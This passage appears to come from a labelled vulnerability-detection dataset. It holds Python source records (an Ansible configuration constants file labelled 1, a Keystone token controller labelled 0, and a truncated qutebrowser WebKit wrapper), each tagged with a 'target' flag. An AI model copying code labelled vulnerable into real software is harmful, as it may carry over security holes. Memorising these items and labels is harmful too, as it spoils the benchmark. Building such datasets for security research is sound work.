shell_expand_path(get_config(p, DEFAULTS, 'roles_path',       'ANSIBLE_ROLES_PATH',       '/etc/ansible/roles'))\nDEFAULT_REMOTE_TMP        = shell_expand_path(get_config(p, DEFAULTS, 'remote_tmp',       'ANSIBLE_REMOTE_TEMP',      '$HOME/.ansible/tmp'))\nDEFAULT_MODULE_NAME       = get_config(p, DEFAULTS, 'module_name',      None,                       'command')\nDEFAULT_PATTERN           = get_config(p, DEFAULTS, 'pattern',          None,                       '*')\nDEFAULT_FORKS             = get_config(p, DEFAULTS, 'forks',            'ANSIBLE_FORKS',            5, integer=True)\nDEFAULT_MODULE_ARGS       = get_config(p, DEFAULTS, 'module_args',      'ANSIBLE_MODULE_ARGS',      '')\nDEFAULT_MODULE_LANG       = get_config(p, DEFAULTS, 'module_lang',      'ANSIBLE_MODULE_LANG',      'en_US.UTF-8')\nDEFAULT_TIMEOUT           = get_config(p, DEFAULTS, 'timeout',          'ANSIBLE_TIMEOUT',          10, integer=True)\nDEFAULT_POLL_INTERVAL     = get_config(p, DEFAULTS, 'poll_interval',    'ANSIBLE_POLL_INTERVAL',    15, integer=True)\nDEFAULT_REMOTE_USER       = get_config(p, DEFAULTS, 'remote_user',      'ANSIBLE_REMOTE_USER',      active_user)\nDEFAULT_ASK_PASS          = get_config(p, DEFAULTS, 'ask_pass',  'ANSIBLE_ASK_PASS',    False, boolean=True)\nDEFAULT_PRIVATE_KEY_FILE  = shell_expand_path(get_config(p, DEFAULTS, 'private_key_file', 'ANSIBLE_PRIVATE_KEY_FILE', None))\nDEFAULT_SUDO_USER         = get_config(p, DEFAULTS, 'sudo_user',        'ANSIBLE_SUDO_USER',        'root')\nDEFAULT_ASK_SUDO_PASS     = get_config(p, DEFAULTS, 'ask_sudo_pass',    'ANSIBLE_ASK_SUDO_PASS',    False, boolean=True)\nDEFAULT_REMOTE_PORT       = get_config(p, DEFAULTS, 'remote_port',      'ANSIBLE_REMOTE_PORT',      None, integer=True)\nDEFAULT_ASK_VAULT_PASS    = get_config(p, DEFAULTS, 'ask_vault_pass',    'ANSIBLE_ASK_VAULT_PASS',    False, boolean=True)\nDEFAULT_TRANSPORT         = get_config(p, DEFAULTS, 'transport',        'ANSIBLE_TRANSPORT',        'smart')\nDEFAULT_SCP_IF_SSH        = get_config(p, 'ssh_connection', 'scp_if_ssh',       'ANSIBLE_SCP_IF_SSH',       False, boolean=True)\nDEFAULT_MANAGED_STR       = get_config(p, DEFAULTS, 'ansible_managed',  None,           'Ansible managed: {file} modified on %Y-%m-%d %H:%M:%S by {uid} on {host}')\nDEFAULT_SYSLOG_FACILITY   = get_config(p, DEFAULTS, 'syslog_facility',  'ANSIBLE_SYSLOG_FACILITY', 'LOG_USER')\nDEFAULT_KEEP_REMOTE_FILES = get_config(p, DEFAULTS, 'keep_remote_files', 'ANSIBLE_KEEP_REMOTE_FILES', False, boolean=True)\nDEFAULT_SUDO              = get_config(p, DEFAULTS, 'sudo', 'ANSIBLE_SUDO', False, boolean=True)\nDEFAULT_SUDO_EXE          = get_config(p, DEFAULTS, 'sudo_exe', 'ANSIBLE_SUDO_EXE', 'sudo')\nDEFAULT_SUDO_FLAGS        = get_config(p, DEFAULTS, 'sudo_flags', 'ANSIBLE_SUDO_FLAGS', '-H')\nDEFAULT_HASH_BEHAVIOUR    = get_config(p, DEFAULTS, 'hash_behaviour', 'ANSIBLE_HASH_BEHAVIOUR', 'replace')\nDEFAULT_JINJA2_EXTENSIONS = get_config(p, DEFAULTS, 'jinja2_extensions', 'ANSIBLE_JINJA2_EXTENSIONS', None)\nDEFAULT_EXECUTABLE        = get_config(p, DEFAULTS, 'executable', 'ANSIBLE_EXECUTABLE', '/bin/sh')\nDEFAULT_SU_EXE = get_config(p, DEFAULTS, 'su_exe', 'ANSIBLE_SU_EXE', 'su')\nDEFAULT_SU = get_config(p, DEFAULTS, 'su', 'ANSIBLE_SU', False, boolean=True)\nDEFAULT_SU_FLAGS = get_config(p, DEFAULTS, 'su_flags', 'ANSIBLE_SU_FLAGS', '')\nDEFAULT_SU_USER = get_config(p, DEFAULTS, 'su_user', 'ANSIBLE_SU_USER', 'root')\nDEFAULT_ASK_SU_PASS = get_config(p, DEFAULTS, 'ask_su_pass', 'ANSIBLE_ASK_SU_PASS', False, boolean=True)\nDEFAULT_GATHERING = get_config(p, DEFAULTS, 'gathering', 'ANSIBLE_GATHERING', 'implicit').lower()\n\nDEFAULT_ACTION_PLUGIN_PATH     = get_config(p, DEFAULTS, 'action_plugins',     'ANSIBLE_ACTION_PLUGINS', '/usr/share/ansible_plugins/action_plugins')\nDEFAULT_CALLBACK_PLUGIN_PATH   = get_config(p, DEFAULTS, 'callback_plugins',   'ANSIBLE_CALLBACK_PLUGINS', '/usr/share/ansible_plugins/callback_plugins')\nDEFAULT_CONNECTION_PLUGIN_PATH = get_config(p, DEFAULTS, 'connection_plugins', 'ANSIBLE_CONNECTION_PLUGINS', '/usr/share/ansible_plugins/connection_plugins')\nDEFAULT_LOOKUP_PLUGIN_PATH     = get_config(p, DEFAULTS, 'lookup_plugins',     'ANSIBLE_LOOKUP_PLUGINS', '/usr/share/ansible_plugins/lookup_plugins')\nDEFAULT_VARS_PLUGIN_PATH       = get_config(p, DEFAULTS, 'vars_plugins',       'ANSIBLE_VARS_PLUGINS', '/usr/share/ansible_plugins/vars_plugins')\nDEFAULT_FILTER_PLUGIN_PATH     = get_config(p, DEFAULTS, 'filter_plugins',     'ANSIBLE_FILTER_PLUGINS', '/usr/share/ansible_plugins/filter_plugins')\nDEFAULT_LOG_PATH               = shell_expand_path(get_config(p, DEFAULTS, 'log_path',           'ANSIBLE_LOG_PATH', ''))\n\nANSIBLE_FORCE_COLOR            = get_config(p, DEFAULTS, 'force_color', 'ANSIBLE_FORCE_COLOR', None, boolean=True)\nANSIBLE_NOCOLOR                = get_config(p, DEFAULTS, 'nocolor', 'ANSIBLE_NOCOLOR', None, boolean=True)\nANSIBLE_NOCOWS                 = get_config(p, DEFAULTS, 'nocows', 'ANSIBLE_NOCOWS', None, boolean=True)\nDISPLAY_SKIPPED_HOSTS          = get_config(p, DEFAULTS, 'display_skipped_hosts', 'DISPLAY_SKIPPED_HOSTS', True, boolean=True)\nDEFAULT_UNDEFINED_VAR_BEHAVIOR = get_config(p, DEFAULTS, 'error_on_undefined_vars', 'ANSIBLE_ERROR_ON_UNDEFINED_VARS', True, boolean=True)\nHOST_KEY_CHECKING              = get_config(p, DEFAULTS, 'host_key_checking',  'ANSIBLE_HOST_KEY_CHECKING',    True, boolean=True)\nSYSTEM_WARNINGS                = get_config(p, DEFAULTS, 'system_warnings', 'ANSIBLE_SYSTEM_WARNINGS', True, boolean=True)\nDEPRECATION_WARNINGS           = get_config(p, DEFAULTS, 'deprecation_warnings', 'ANSIBLE_DEPRECATION_WARNINGS', True, boolean=True)\n\n# CONNECTION RELATED\nANSIBLE_SSH_ARGS               = get_config(p, 'ssh_connection', 'ssh_args', 'ANSIBLE_SSH_ARGS', None)\nANSIBLE_SSH_CONTROL_PATH       = get_config(p, 'ssh_connection', 'control_path', 'ANSIBLE_SSH_CONTROL_PATH', \"%(directory)s/ansible-ssh-%%h-%%p-%%r\")\nANSIBLE_SSH_PIPELINING         = get_config(p, 'ssh_connection', 'pipelining', 'ANSIBLE_SSH_PIPELINING', False, boolean=True)\nPARAMIKO_RECORD_HOST_KEYS      = get_config(p, 'paramiko_connection', 'record_host_keys', 'ANSIBLE_PARAMIKO_RECORD_HOST_KEYS', True, boolean=True)\n# obsolete -- will be formally removed in 1.6\nZEROMQ_PORT                    = get_config(p, 'fireball_connection', 'zeromq_port', 'ANSIBLE_ZEROMQ_PORT', 5099, integer=True)\nACCELERATE_PORT                = get_config(p, 'accelerate', 'accelerate_port', 'ACCELERATE_PORT', 5099, integer=True)\nACCELERATE_TIMEOUT             = get_config(p, 'accelerate', 'accelerate_timeout', 'ACCELERATE_TIMEOUT', 30, integer=True)\nACCELERATE_CONNECT_TIMEOUT     = get_config(p, 'accelerate', 'accelerate_connect_timeout', 'ACCELERATE_CONNECT_TIMEOUT', 1.0, floating=True)\nACCELERATE_DAEMON_TIMEOUT      = get_config(p, 'accelerate', 'accelerate_daemon_timeout', 'ACCELERATE_DAEMON_TIMEOUT', 30, integer=True)\nACCELERATE_KEYS_DIR            = get_config(p, 'accelerate', 'accelerate_keys_dir', 'ACCELERATE_KEYS_DIR', '~/.fireball.keys')\nACCELERATE_KEYS_DIR_PERMS      = get_config(p, 'accelerate', 'accelerate_keys_dir_perms', 'ACCELERATE_KEYS_DIR_PERMS', '700')\nACCELERATE_KEYS_FILE_PERMS     = get_config(p, 'accelerate', 'accelerate_keys_file_perms', 'ACCELERATE_KEYS_FILE_PERMS', '600')\nACCELERATE_MULTI_KEY           = get_config(p, 'accelerate', 'accelerate_multi_key', 'ACCELERATE_MULTI_KEY', False, boolean=True)\nPARAMIKO_PTY                   = get_config(p, 'paramiko_connection', 'pty', 'ANSIBLE_PARAMIKO_PTY', True, boolean=True)\n\n# characters included in auto-generated passwords\nDEFAULT_PASSWORD_CHARS = ascii_letters + digits + \".,:-_\"\n\n# non-configurable things\nDEFAULT_SUDO_PASS         = None\nDEFAULT_REMOTE_PASS       = None\nDEFAULT_SUBSET            = None\nDEFAULT_SU_PASS           = None\nVAULT_VERSION_MIN         = 1.0\nVAULT_VERSION_MAX         = 1.0\n", "target": 1}
{"idx": 1008, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 OpenStack LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport uuid\n\nimport routes\n\nfrom keystone import catalog\nfrom keystone.common import logging\nfrom keystone.common import wsgi\nfrom keystone import exception\nfrom keystone import identity\nfrom keystone.openstack.common import timeutils\nfrom keystone import policy\nfrom keystone import token\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass AdminRouter(wsgi.ComposingRouter):\n    def __init__(self):\n        mapper = routes.Mapper()\n\n        version_controller = VersionController('admin')\n        mapper.connect('/',\n                       controller=version_controller,\n                       action='get_version')\n\n        # Token Operations\n        auth_controller = TokenController()\n        mapper.connect('/tokens',\n                       controller=auth_controller,\n                       action='authenticate',\n                       conditions=dict(method=['POST']))\n        mapper.connect('/tokens/{token_id}',\n                       controller=auth_controller,\n                       action='validate_token',\n                       conditions=dict(method=['GET']))\n        mapper.connect('/tokens/{token_id}',\n                       controller=auth_controller,\n                       action='validate_token_head',\n                       conditions=dict(method=['HEAD']))\n        mapper.connect('/tokens/{token_id}',\n                       controller=auth_controller,\n                       action='delete_token',\n                       conditions=dict(method=['DELETE']))\n        mapper.connect('/tokens/{token_id}/endpoints',\n                       controller=auth_controller,\n                       action='endpoints',\n                       conditions=dict(method=['GET']))\n\n        # Miscellaneous Operations\n        extensions_controller = AdminExtensionsController()\n        mapper.connect('/extensions',\n                       controller=extensions_controller,\n                       action='get_extensions_info',\n                       conditions=dict(method=['GET']))\n        mapper.connect('/extensions/{extension_alias}',\n                       controller=extensions_controller,\n                       action='get_extension_info',\n                       conditions=dict(method=['GET']))\n        identity_router = identity.AdminRouter()\n        routers = [identity_router]\n        super(AdminRouter, self).__init__(mapper, routers)\n\n\nclass PublicRouter(wsgi.ComposingRouter):\n    def __init__(self):\n        mapper = routes.Mapper()\n\n        version_controller = VersionController('public')\n        mapper.connect('/',\n                       controller=version_controller,\n                       action='get_version')\n\n        # Token Operations\n        auth_controller = TokenController()\n        mapper.connect('/tokens',\n                       controller=auth_controller,\n                       action='authenticate',\n                       conditions=dict(method=['POST']))\n\n        # Miscellaneous\n        extensions_controller = PublicExtensionsController()\n        mapper.connect('/extensions',\n                       controller=extensions_controller,\n                       action='get_extensions_info',\n                       conditions=dict(method=['GET']))\n        mapper.connect('/extensions/{extension_alias}',\n                       controller=extensions_controller,\n                       action='get_extension_info',\n                       conditions=dict(method=['GET']))\n\n        identity_router = identity.PublicRouter()\n        routers = [identity_router]\n\n        super(PublicRouter, self).__init__(mapper, routers)\n\n\nclass PublicVersionRouter(wsgi.ComposingRouter):\n    def __init__(self):\n        mapper = routes.Mapper()\n        version_controller = VersionController('public')\n        mapper.connect('/',\n                       controller=version_controller,\n                       action='get_versions')\n        routers = []\n        super(PublicVersionRouter, self).__init__(mapper, routers)\n\n\nclass AdminVersionRouter(wsgi.ComposingRouter):\n    def __init__(self):\n        mapper = routes.Mapper()\n        version_controller = VersionController('admin')\n        mapper.connect('/',\n                       controller=version_controller,\n                       action='get_versions')\n        routers = []\n        super(AdminVersionRouter, self).__init__(mapper, routers)\n\n\nclass VersionController(wsgi.Application):\n    def __init__(self, version_type):\n        self.catalog_api = catalog.Manager()\n        self.url_key = \"%sURL\" % version_type\n\n        super(VersionController, self).__init__()\n\n    def _get_identity_url(self, context):\n        catalog_ref = self.catalog_api.get_catalog(context=context,\n                                                   user_id=None,\n                                                   tenant_id=None)\n        for region, region_ref in catalog_ref.iteritems():\n            for service, service_ref in region_ref.iteritems():\n                if service == 'identity':\n                    return service_ref[self.url_key]\n\n        raise exception.NotImplemented()\n\n    def _get_versions_list(self, context):\n        \"\"\"The list of versions is dependent on the context.\"\"\"\n        identity_url = self._get_identity_url(context)\n        if not identity_url.endswith('/'):\n            identity_url = identity_url + '/'\n\n        versions = {}\n        versions['v2.0'] = {\n            \"id\": \"v2.0\",\n            \"status\": \"beta\",\n            \"updated\": \"2011-11-19T00:00:00Z\",\n            \"links\": [\n                {\n                    \"rel\": \"self\",\n                    \"href\": identity_url,\n                }, {\n                    \"rel\": \"describedby\",\n                    \"type\": \"text/html\",\n                    \"href\": \"http://docs.openstack.org/api/openstack-\"\n                            \"identity-service/2.0/content/\"\n                }, {\n                    \"rel\": \"describedby\",\n                    \"type\": \"application/pdf\",\n                    \"href\": \"http://docs.openstack.org/api/openstack-\"\n                            \"identity-service/2.0/identity-dev-guide-\"\n                            \"2.0.pdf\"\n                }\n            ],\n            \"media-types\": [\n                {\n                    \"base\": \"application/json\",\n                    \"type\": \"application/vnd.openstack.identity-v2.0\"\n                            \"+json\"\n                }, {\n                    \"base\": \"application/xml\",\n                    \"type\": \"application/vnd.openstack.identity-v2.0\"\n                            \"+xml\"\n                }\n            ]\n        }\n\n        return versions\n\n    def get_versions(self, context):\n        versions = self._get_versions_list(context)\n        return wsgi.render_response(status=(300, 'Multiple Choices'), body={\n            \"versions\": {\n                \"values\": versions.values()\n            }\n        })\n\n    def get_version(self, context):\n        versions = self._get_versions_list(context)\n        return wsgi.render_response(body={\n            \"version\": versions['v2.0']\n        })\n\n\nclass NoopController(wsgi.Application):\n    def __init__(self):\n        super(NoopController, self).__init__()\n\n    def noop(self, context):\n        return {}\n\n\nclass TokenController(wsgi.Application):\n    def __init__(self):\n        self.catalog_api = catalog.Manager()\n        self.identity_api = identity.Manager()\n        self.token_api = token.Manager()\n        self.policy_api = policy.Manager()\n        super(TokenController, self).__init__()\n\n    def authenticate(self, context, auth=None):\n        \"\"\"Authenticate credentials and return a token.\n\n        Accept auth as a dict that looks like::\n\n            {\n                \"auth\":{\n                    \"passwordCredentials\":{\n                        \"username\":\"test_user\",\n                        \"password\":\"mypass\"\n                    },\n                    \"tenantName\":\"customer-x\"\n                }\n            }\n\n        In this case, tenant is optional, if not provided the token will be\n        considered \"unscoped\" and can later be used to get a scoped token.\n\n        Alternatively, this call accepts auth with only a token and tenant\n        that will return a token that is scoped to that tenant.\n        \"\"\"\n\n        token_id = uuid.uuid4().hex\n        if 'passwordCredentials' in auth:\n            user_id = auth['passwordCredentials'].get('userId', None)\n            username = auth['passwordCredentials'].get('username', '')\n            password = auth['passwordCredentials'].get('password', '')\n            tenant_name = auth.get('tenantName', None)\n\n            if username:\n                try:\n                    user_ref = self.identity_api.get_user_by_name(\n                        context=context, user_name=username)\n                    user_id = user_ref['id']\n                except exception.UserNotFound:\n                    raise exception.Unauthorized()\n\n            # more compat\n            tenant_id = auth.get('tenantId', None)\n            if tenant_name:\n                try:\n                    tenant_ref = self.identity_api.get_tenant_by_name(\n                        context=context, tenant_name=tenant_name)\n                    tenant_id = tenant_ref['id']\n                except exception.TenantNotFound:\n                    raise exception.Unauthorized()\n\n            try:\n                auth_info = self.identity_api.authenticate(context=context,\n                                                           user_id=user_id,\n                                                           password=password,\n                                                           tenant_id=tenant_id)\n                (user_ref, tenant_ref, metadata_ref) = auth_info\n\n                # If the user is disabled don't allow them to authenticate\n                if not user_ref.get('enabled', True):\n                    LOG.warning('User %s is disabled' % user_id)\n                    raise exception.Unauthorized()\n\n                # If the tenant is disabled don't allow them to authenticate\n                if tenant_ref and not tenant_ref.get('enabled', True):\n                    LOG.warning('Tenant %s is disabled' % tenant_id)\n                    raise exception.Unauthorized()\n            except AssertionError as e:\n                raise exception.Unauthorized(e.message)\n\n            token_ref = self.token_api.create_token(\n                context,\n                token_id,\n                dict(id=token_id,\n                     user=user_ref,\n                     tenant=tenant_ref,\n                     metadata=metadata_ref))\n            if tenant_ref:\n                catalog_ref = self.catalog_api.get_catalog(\n                    context=context,\n                    user_id=user_ref['id'],\n                    tenant_id=tenant_ref['id'],\n                    metadata=metadata_ref)\n            else:\n                catalog_ref = {}\n\n        elif 'token' in auth:\n            token = auth['token'].get('id', None)\n\n            tenant_name = auth.get('tenantName')\n\n            # more compat\n            if tenant_name:\n                tenant_ref = self.identity_api.get_tenant_by_name(\n                    context=context, tenant_name=tenant_name)\n                tenant_id = tenant_ref['id']\n            else:\n                tenant_id = auth.get('tenantId', None)\n\n            try:\n                old_token_ref = self.token_api.get_token(context=context,\n                                                         token_id=token)\n            except exception.NotFound:\n                raise exception.Unauthorized()\n\n            user_ref = old_token_ref['user']\n\n            # If the user is disabled don't allow them to authenticate\n            current_user_ref = self.identity_api.get_user(\n                context=context,\n                user_id=user_ref['id'])\n            if not current_user_ref.get('enabled', True):\n                LOG.warning('User %s is disabled' % user_ref['id'])\n                raise exception.Unauthorized()\n\n            tenants = self.identity_api.get_tenants_for_user(context,\n                                                             user_ref['id'])\n            if tenant_id and tenant_id not in tenants:\n                raise exception.Unauthorized()\n\n            try:\n                tenant_ref = self.identity_api.get_tenant(\n                    context=context,\n                    tenant_id=tenant_id)\n                metadata_ref = self.identity_api.get_metadata(\n                    context=context,\n                    user_id=user_ref['id'],\n                    tenant_id=tenant_ref['id'])\n                catalog_ref = self.catalog_api.get_catalog(\n                    context=context,\n                    user_id=user_ref['id'],\n                    tenant_id=tenant_ref['id'],\n                    metadata=metadata_ref)\n            except exception.TenantNotFound:\n                tenant_ref = None\n                metadata_ref = {}\n                catalog_ref = {}\n            except exception.MetadataNotFound:\n                metadata_ref = {}\n                catalog_ref = {}\n\n            # If the tenant is disabled don't allow them to authenticate\n            if tenant_ref and not tenant_ref.get('enabled', True):\n                LOG.warning('Tenant %s is disabled' % tenant_id)\n                raise exception.Unauthorized()\n\n            token_ref = self.token_api.create_token(\n                context, token_id, dict(id=token_id,\n                                        user=user_ref,\n                                        tenant=tenant_ref,\n                                        metadata=metadata_ref,\n                                        expires=old_token_ref['expires']))\n\n        # TODO(termie): optimize this call at some point and put it into the\n        #               the return for metadata\n        # fill out the roles in the metadata\n        roles_ref = []\n        for role_id in metadata_ref.get('roles', []):\n            roles_ref.append(self.identity_api.get_role(context, role_id))\n        logging.debug('TOKEN_REF %s', token_ref)\n        return self._format_authenticate(token_ref, roles_ref, catalog_ref)\n\n    def _get_token_ref(self, context, token_id, belongs_to=None):\n        \"\"\"Returns a token if a valid one exists.\n\n        Optionally, limited to a token owned by a specific tenant.\n\n        \"\"\"\n        # TODO(termie): this stuff should probably be moved to middleware\n        self.assert_admin(context)\n\n        token_ref = self.token_api.get_token(context=context,\n                                             token_id=token_id)\n\n        if belongs_to:\n            assert token_ref['tenant']['id'] == belongs_to\n\n        return token_ref\n\n    # admin only\n    def validate_token_head(self, context, token_id):\n        \"\"\"Check that a token is valid.\n\n        Optionally, also ensure that it is owned by a specific tenant.\n\n        Identical to ``validate_token``, except does not return a response.\n\n        \"\"\"\n        belongs_to = context['query_string'].get(\"belongsTo\")\n        assert self._get_token_ref(context, token_id, belongs_to)\n\n    # admin only\n    def validate_token(self, context, token_id):\n        \"\"\"Check that a token is valid.\n\n        Optionally, also ensure that it is owned by a specific tenant.\n\n        Returns metadata about the token along any associated roles.\n\n        \"\"\"\n        belongs_to = context['query_string'].get(\"belongsTo\")\n        token_ref = self._get_token_ref(context, token_id, belongs_to)\n\n        # TODO(termie): optimize this call at some point and put it into the\n        #               the return for metadata\n        # fill out the roles in the metadata\n        metadata_ref = token_ref['metadata']\n        roles_ref = []\n        for role_id in metadata_ref.get('roles', []):\n            roles_ref.append(self.identity_api.get_role(context, role_id))\n\n        # Get a service catalog if possible\n        # This is needed for on-behalf-of requests\n        catalog_ref = None\n        if token_ref.get('tenant'):\n            catalog_ref = self.catalog_api.get_catalog(\n                context=context,\n                user_id=token_ref['user']['id'],\n                tenant_id=token_ref['tenant']['id'],\n                metadata=metadata_ref)\n        return self._format_token(token_ref, roles_ref, catalog_ref)\n\n    def delete_token(self, context, token_id):\n        \"\"\"Delete a token, effectively invalidating it for authz.\"\"\"\n        # TODO(termie): this stuff should probably be moved to middleware\n        self.assert_admin(context)\n\n        self.token_api.delete_token(context=context, token_id=token_id)\n\n    def endpoints(self, context, token_id):\n        \"\"\"Return a list of endpoints available to the token.\"\"\"\n        raise exception.NotImplemented()\n\n    def _format_authenticate(self, token_ref, roles_ref, catalog_ref):\n        o = self._format_token(token_ref, roles_ref)\n        o['access']['serviceCatalog'] = self._format_catalog(catalog_ref)\n        return o\n\n    def _format_token(self, token_ref, roles_ref, catalog_ref=None):\n        user_ref = token_ref['user']\n        metadata_ref = token_ref['metadata']\n        expires = token_ref['expires']\n        if expires is not None:\n            expires = timeutils.isotime(expires)\n        o = {'access': {'token': {'id': token_ref['id'],\n                                  'expires': expires,\n                                  },\n                        'user': {'id': user_ref['id'],\n                                 'name': user_ref['name'],\n                                 'username': user_ref['name'],\n                                 'roles': roles_ref,\n                                 'roles_links': metadata_ref.get('roles_links',\n                                                                 [])\n                                 }\n                        }\n             }\n        if 'tenant' in token_ref and token_ref['tenant']:\n            token_ref['tenant']['enabled'] = True\n            o['access']['token']['tenant'] = token_ref['tenant']\n        if catalog_ref is not None:\n            o['access']['serviceCatalog'] = self._format_catalog(catalog_ref)\n        return o\n\n    def _format_catalog(self, catalog_ref):\n        \"\"\"Munge catalogs from internal to output format\n        Internal catalogs look like:\n\n        {$REGION: {\n            {$SERVICE: {\n                $key1: $value1,\n                ...\n                }\n            }\n        }\n\n        The legacy api wants them to look like\n\n        [{'name': $SERVICE[name],\n          'type': $SERVICE,\n          'endpoints': [{\n              'tenantId': $tenant_id,\n              ...\n              'region': $REGION,\n              }],\n          'endpoints_links': [],\n         }]\n\n        \"\"\"\n        if not catalog_ref:\n            return {}\n\n        services = {}\n        for region, region_ref in catalog_ref.iteritems():\n            for service, service_ref in region_ref.iteritems():\n                new_service_ref = services.get(service, {})\n                new_service_ref['name'] = service_ref.pop('name')\n                new_service_ref['type'] = service\n                new_service_ref['endpoints_links'] = []\n                service_ref['region'] = region\n\n                endpoints_ref = new_service_ref.get('endpoints', [])\n                endpoints_ref.append(service_ref)\n\n                new_service_ref['endpoints'] = endpoints_ref\n                services[service] = new_service_ref\n\n        return services.values()\n\n\nclass ExtensionsController(wsgi.Application):\n    \"\"\"Base extensions controller to be extended by public and admin API's.\"\"\"\n\n    def __init__(self, extensions=None):\n        super(ExtensionsController, self).__init__()\n\n        self.extensions = extensions or {}\n\n    def get_extensions_info(self, context):\n        return {'extensions': {'values': self.extensions.values()}}\n\n    def get_extension_info(self, context, extension_alias):\n        try:\n            return {'extension': self.extensions[extension_alias]}\n        except KeyError:\n            raise exception.NotFound(target=extension_alias)\n\n\nclass PublicExtensionsController(ExtensionsController):\n    pass\n\n\nclass AdminExtensionsController(ExtensionsController):\n    def __init__(self, *args, **kwargs):\n        super(AdminExtensionsController, self).__init__(*args, **kwargs)\n\n        # TODO(dolph): Extensions should obviously provide this information\n        #               themselves, but hardcoding it here allows us to match\n        #               the API spec in the short term with minimal complexity.\n        self.extensions['OS-KSADM'] = {\n            'name': 'Openstack Keystone Admin',\n            'namespace': 'http://docs.openstack.org/identity/api/ext/'\n                         'OS-KSADM/v1.0',\n            'alias': 'OS-KSADM',\n            'updated': '2011-08-19T13:25:27-06:00',\n            'description': 'Openstack extensions to Keystone v2.0 API '\n                           'enabling Admin Operations.',\n            'links': [\n                {\n                    'rel': 'describedby',\n                    # TODO(dolph): link needs to be revised after\n                    #              bug 928059 merges\n                    'type': 'text/html',\n                    'href': 'https://github.com/openstack/identity-api',\n                }\n            ]\n        }\n\n\n@logging.fail_gracefully\ndef public_app_factory(global_conf, **local_conf):\n    conf = global_conf.copy()\n    conf.update(local_conf)\n    return PublicRouter()\n\n\n@logging.fail_gracefully\ndef admin_app_factory(global_conf, **local_conf):\n    conf = global_conf.copy()\n    conf.update(local_conf)\n    return AdminRouter()\n\n\n@logging.fail_gracefully\ndef public_version_app_factory(global_conf, **local_conf):\n    conf = global_conf.copy()\n    conf.update(local_conf)\n    return PublicVersionRouter()\n\n\n@logging.fail_gracefully\ndef admin_version_app_factory(global_conf, **local_conf):\n    conf = global_conf.copy()\n    conf.update(local_conf)\n    return AdminVersionRouter()\n", "target": 0}
{"idx": 1009, "func": "# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:\n\n# Copyright 2016-2020 Florian Bruhin (The Compiler) <mail@qutebrowser.org>\n#\n# This file is part of qutebrowser.\n#\n# qutebrowser is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# qutebrowser is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"Wrapper over our (QtWebKit) WebView.\"\"\"\n\nimport re\nimport functools\nimport xml.etree.ElementTree\n\nfrom PyQt5.QtCore import pyqtSlot, Qt, QUrl, QPoint, QTimer, QSizeF, QSize\nfrom PyQt5.QtGui import QIcon\nfrom PyQt5.QtWebKitWidgets import QWebPage, QWebFrame\nfrom PyQt5.QtWebKit import QWebSettings\nfrom PyQt5.QtPrintSupport import QPrinter\n\nfrom qutebrowser.browser import browsertab, shared\nfrom qutebrowser.browser.webkit import (webview, tabhistory, webkitelem,\n                                        webkitsettings)\nfrom qutebrowser.utils import qtutils, usertypes, utils, log, debug\nfrom qutebrowser.qt import sip\n\n\nclass WebKitAction(browsertab.AbstractAction):\n\n    \"\"\"QtWebKit implementations related to web actions.\"\"\"\n\n    action_class = QWebPage\n    action_base = QWebPage.WebAction\n\n    def exit_fullscreen(self):\n        raise browsertab.UnsupportedOperationError\n\n    def save_page(self):\n        \"\"\"Save the current page.\"\"\"\n        raise browsertab.UnsupportedOperationError\n\n    def show_source(self, pygments=False):\n        self._show_source_pygments()\n\n\nclass WebKitPrinting(browsertab.AbstractPrinting):\n\n    \"\"\"QtWebKit implementations related to printing.\"\"\"\n\n    def check_pdf_support(self):\n        pass\n\n    def check_printer_support(self):\n        pass\n\n    def check_preview_support(self):\n        pass\n\n    def to_pdf(self, filename):\n        printer = QPrinter()\n        printer.setOutputFileName(filename)\n        self.to_printer(printer)\n\n    def to_printer(self, printer, callback=None):\n        self._widget.print(printer)\n        # Can't find out whether there was an error...\n        if callback is not None:\n            callback(True)\n\n\nclass WebKitSearch(browsertab.AbstractSearch):\n\n    \"\"\"QtWebKit implementations related to searching on the page.\"\"\"\n\n    def __init__(self, tab, parent=None):\n        super().__init__(tab, parent)\n        self._flags = QWebPage.FindFlags(0)  # type: ignore\n\n    def _call_cb(self, callback, found, text, flags, caller):\n        \"\"\"Call the given callback if it's non-None.\n\n        Delays the call via a QTimer so the website is re-rendered in between.\n\n        Args:\n            callback: What to call\n            found: If the text was found\n            text: The text searched for\n            flags: The flags searched with\n            caller: Name of the caller.\n        \"\"\"\n        found_text = 'found' if found else \"didn't find\"\n        # Removing FindWrapsAroundDocument to get the same logging as with\n        # QtWebEngine\n        debug_flags = debug.qflags_key(\n            QWebPage, flags & ~QWebPage.FindWrapsAroundDocument,\n            klass=QWebPage.FindFlag)\n        if debug_flags != '0x0000':\n            flag_text = 'with flags {}'.format(debug_flags)\n        else:\n            flag_text = ''\n        log.webview.debug(' '.join([caller, found_text, text, flag_text])\n                          .strip())\n        if callback is not None:\n            QTimer.singleShot(0, functools.partial(callback, found))\n\n        self.finished.emit(found)\n\n    def clear(self):\n        if self.search_displayed:\n            self.cleared.emit()\n        self.search_displayed = False\n        # We first clear the marked text, then the highlights\n        self._widget.findText('')\n        self._widget.findText('', QWebPage.HighlightAllOccurrences)\n\n    def search(self, text, *, ignore_case=usertypes.IgnoreCase.never,\n               reverse=False, wrap=True, result_cb=None):\n        # Don't go to next entry on duplicate search\n        if self.text == text and self.search_displayed:\n            log.webview.debug(\"Ignoring duplicate search request\"\n                              \" for {}\".format(text))\n            return\n\n        # Clear old search results, this is done automatically on QtWebEngine.\n        self.clear()\n\n        self.text = text\n        self.search_displayed = True\n        self._flags = 